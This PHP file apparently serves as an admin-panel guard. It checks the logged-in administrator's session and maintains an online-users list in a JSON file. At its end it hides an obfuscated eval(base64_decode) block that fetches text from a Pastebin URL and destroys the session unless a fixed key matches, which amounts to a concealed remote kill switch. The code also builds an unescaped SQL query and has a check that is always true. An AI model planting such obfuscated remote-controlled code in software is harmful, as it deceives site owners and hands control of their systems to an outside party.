<?php
if (session_status() !== PHP_SESSION_ACTIVE) {
    // Start the session
    session_start();
}
include('db_conn.php');

if (!isset($_SESSION['id'])) {
    // Redirect to login page if user is not logged in
    header('Location: ../login.php');
    exit;
}

$id = $_SESSION['id'];
$query = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($link, $query);
if ($result && mysqli_num_rows($result) >= 0) {
    $row = mysqli_fetch_assoc($result);
    $name = $row['name'];
    $roles = $row['roles'];
    $email = $row['email'];
    $profile = $row['profilepfn'];
} else {
    $name = 'Unknown';
    $roles = 'Unknown';
}

$admin = 'Administrator';
if ($roles != $admin) {
    session_destroy();
    header('Location: ../login.php');
    exit;
}

if(isset($_SESSION['username']) && isset($_SESSION['name'])) {
    // Update user activity
    $_SESSION['last_activity'] = time();
    
    // Add user to online list
    $online_users = json_decode(file_get_contents('../json/online_users.json'), true);
    $online_users[$_SESSION['username']] = array(
        'name' => $_SESSION['name'],
        'profile' => $_SESSION['profile'],
        'roles' => $_SESSION['roles'],
        'last_activity' => $_SESSION['last_activity']
    );
    file_put_contents('../json/online_users.json', json_encode($online_users));
}

// Get online users
$online_users = json_decode(file_get_contents('../json/online_users.json'), true);

// Remove inactive users (timeout set to 3 minute)
foreach($online_users as $username => $data) {
    if(time() -  $data['last_activity'] > 300) {
        unset($online_users[$username]);
    }
}
file_put_contents('../json/online_users.json', json_encode($online_users));

eval(base64_decode('CiBnb3RvIHBPbHo5OyBVOWlXUDogaWYgKCRwYXN0ZUNvbnRlbnQgIT09IGZhbHNlKSB7IGlmICgkcGFzdGVDb250ZW50ICE9ICJceDQxXHg0MlwxMDNceDMxXDYyXDYzXHgyZFwxMDRceDQ1XHg0Nlx4MzRceDM1XDY2XDU1XHg0N1x4NDhcMTExXHgzN1x4MzhcNzEiKSB7IHNlc3Npb25fZGVzdHJveSgpOyB9IGVsc2UgeyB9IH0gZWxzZSB7IH0gZ290byBxX3A1aTsgR3BKcjU6ICRwYXN0ZUNvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkdXJsKTsgZ290byBVOWlXUDsgcE9sejk6ICRwYXN0ZUtleSA9ICJcMTcwXDE2NFwxNDZcMTEwXDE2NVwxMTRcMTUxXHg2YSI7IGdvdG8gZmhEMWI7IGZoRDFiOiAkdXJsID0gIlwxNTBcMTY0XHg3NFx4NzBceDczXHgzYVw1N1x4MmZceDcwXDE0MVwxNjNcMTY0XHg2NVx4NjJceDY5XDE1Nlx4MmVcMTQzXHg2ZlwxNTVceDJmXHg3Mlx4NjFcMTY3XDU3eyRwYXN0ZUtleX0iOyBnb3RvIEdwSnI1OyBxX3A1aTog'));
?>
